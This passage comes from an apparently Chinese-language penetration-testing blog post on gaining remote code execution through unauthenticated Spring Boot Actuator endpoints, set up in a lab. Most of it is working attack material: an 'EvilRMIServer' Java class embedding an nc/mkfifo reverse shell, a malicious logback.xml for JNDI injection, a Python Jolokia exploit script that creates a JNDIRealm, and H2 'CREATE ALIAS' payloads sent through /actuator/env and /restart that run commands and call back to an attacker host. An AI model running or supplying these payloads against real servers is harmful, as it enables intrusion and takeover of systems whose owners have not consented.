class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d4957a0c50e626f62d06f5fc2853ddbb.png" class>



<p>将上面打包的jar放到kali上，开启8090端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d1dffff25909ba0840e280f858d32e0d.png" class>

<p>使用nc开启监听1234端口</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b531b990d627d9069028dcea04343c27.png" class>



<p>下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.249:8090/jndi&quot; as=&quot;appName&quot;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>在浏览器中从外部构造url访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>



<p>浏览器返回结果如下:</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/1e7783f49e5d0511d34e21997052151e.png" class>

<p>可以看到kali下获取反弹的shell</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/a288f1cbdbcfd6a43eb37a0aa8362ef4.png" class>



<p><strong>注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</strong></p>
<h5 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a><strong>利用原理</strong></h5><ul>
<li><p>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用<br>ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</p>
</li>
<li><p>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</p>
</li>
<li><p>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</p>
</li>
<li><p>xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址</p>
</li>
<li><p>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</p>
</li>
</ul>
<p>详细分析参见下文:</p>
<p><a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
<h4 id="2-5-createJNDIRealm-RCE"><a href="#2-5-createJNDIRealm-RCE" class="headerlink" title="2.5.createJNDIRealm RCE"></a>2.5.createJNDIRealm RCE</h4><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li>
</ul>
<h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 Java代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 打包java代码文件</strong></p>
<p>将编辑好的java代码打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发送恶意 payload</strong></p>
<p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行</p>
<h5 id="利用实例-4"><a href="#利用实例-4" class="headerlink" title="利用实例"></a>利用实例</h5><p>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/4f19e2342528cdbb64de48d186e11598.png" class>



<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d4957a0c50e626f62d06f5fc2853ddbb.png" class>



<p>使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/22d452ce68c413decf2ec38b91407be8.png" class>



<p>在kali上使用nc监听1234端口</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/6c60a7d0bba412dd195a483ca8f132df.png" class>



<p>使用exploit.py脚本对目标进行重放</p>
<p>代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://192.168.233.249:8090/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在kali上使用python运行该脚本，指定目标ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:python exploit.py http://192.168.233.247:8090</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/9a08beff758b28b994d334ea398a856f.png" class>



<p>该脚本运行成功后，可以看到kali的nc反弹shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/f234a703de0dd6e5042e6ee09f60fb1e.png" class>



<h5 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>创建 JNDIRealm</li>
<li>写入 contextFactory 为 RegistryContextFactory</li>
<li>写入 connectionURL 为你的 RMI Service URL</li>
<li>停止 Realm</li>
<li>启动 Realm 以触发 JNDI 注入</li>
</ul>
<p>详细分析请参见</p>
<p><a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
<h4 id="2-6-restart-h2-database-query-RCE"><a href="#2-6-restart-h2-database-query-RCE" class="headerlink" title="2.6.restart h2 database query RCE"></a>2.6.restart h2 database query RCE</h4><h5 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>
<h5 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</strong></p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>
<p>spring 1.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>str1,str2和str3这三个参数组成要执行的命令</strong></p>
<p>spring 2.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-5"><a href="#利用实例-5" class="headerlink" title="利用实例"></a>利用实例</h5><p>首先判断在&#x2F;env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830180327037.png" class title="image-20210830180327037">



<p>构造Post请求&#x2F;actuator&#x2F;env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口</p>
<p>请求数据包如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T6 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T6(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行</strong></p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830180618708.png" class title="image-20210830180618708">



<p>在自己的主机上使用nc监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造请求&#x2F;actuator&#x2F;restart数据包，重启</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830180129484.png" class title="image-20210830180129484">



<p>重启后，可以看到目标连接成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830181954887.png" class title="image-20210830181954887">





<h5 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
<li>restart 重启应用，会建立新的数据库连接</li>
<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ul>
<p>详细分析参见下文</p>
<p><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
<h4 id="2-7restart-spring-datasource-data-h2-database-RCE"><a href="#2-7restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="2.7restart spring.datasource.data h2 database RCE"></a>2.7restart spring.datasource.data h2 database RCE</h4><h5 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
</ul>
<h5 id="利用方法-8"><a href="#利用方法-8" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：编写sql 文件并托管</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;ip地址&#x27;,&#x27;port&#x27;);</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.datasource.data 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





